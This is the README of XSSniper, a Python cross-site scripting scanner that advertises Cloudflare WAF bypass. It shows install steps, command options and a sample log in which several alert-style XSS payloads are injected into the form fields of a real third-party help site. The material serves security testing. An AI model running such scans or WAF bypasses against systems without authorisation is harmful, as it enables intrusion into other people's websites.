# XSSniper

<img src="background.png" width="900">

## A XSS scanner with WAF bypass features

<!-- FEATURES -->
## Features:

- Cloudflare WAF and JS challenge bypass with user-agent rotation and cloudscraper
- Finds potentially vulnerable JavaScript code and searches for injection points
- Creates a PoC for XSS and tests it automatically
- Written in Python
- Lots of payloads

<!-- INSTALLATION -->
## Installation:

    $ git clone https://github.com/umutcamliyurt/XSSniper.git
    $ cd XSSniper/
    $ sudo apt-get install python3 python3-pip
    $ pip3 install -r requirements.txt
    $ python3 XSSniper.py

<!-- USAGE -->
## Usage:

### Options:

```
python3 XSSniper.py --help
Loaded 138 payloads from 'payloads.txt'.
usage: XSSniper [-h] [-c COOKIE] [-l LOGFILE] [--poc [POC]] [--no-cookies] [--keep-going] [--delay DELAY] url

positional arguments:
  url                   Target URL

options:
  -h, --help            show this help message and exit
  -c, --cookie COOKIE   Cookie header
  -l, --logfile LOGFILE
  --poc [POC]           Enter PoC mode (optionally supply a JSON file path)
  --no-cookies          Clear cookies per payload injection
  --keep-going          Continue testing all injection points after finding XSS
  --delay DELAY         Delay in seconds after page load before testing (default: 5)
```
<!-- EXAMPLE -->
### Example:

```
python3 XSSniper.py https://www.help.tinder.com --poc
Loaded 138 payloads from 'payloads.txt'.
[DEBUG] Using User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.54 Safari/537.36
2025-07-07 16:26:41,332 [INFO] Loaded 200 injection points.
2025-07-07 16:26:41,333 [INFO] Running PoC tests in normal mode. Keep going: False. Delay: 5s
[DEBUG] Using User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
2025-07-07 16:26:54,861 [INFO] Detected 2 forms.
2025-07-07 16:27:06,057 [INFO] Injecting payload '<script>alert("XSS by Nemesis")</script>' into element <input type='hidden' name='utf8'>
2025-07-07 16:27:06,136 [INFO] Injecting payload '<script>alert("XSS by Nemesis")</script>' into element <input type='search' name='query'>
2025-07-07 16:27:24,741 [INFO] Injecting payload '"<img src=x onerror=alert("XSS by Nemesis")>' into element <input type='hidden' name='utf8'>
2025-07-07 16:27:24,826 [INFO] Injecting payload '"<img src=x onerror=alert("XSS by Nemesis")>' into element <input type='search' name='query'>
2025-07-07 16:27:44,072 [INFO] Injecting payload '';alert("XSS by Nemesis")//' into element <input type='hidden' name='utf8'>
2025-07-07 16:27:44,138 [INFO] Injecting payload '';alert("XSS by Nemesis")//' into element <input type='search' name='query'>
```

<!-- LICENSE -->
## License

Distributed under the MIT License. See `LICENSE` for more information.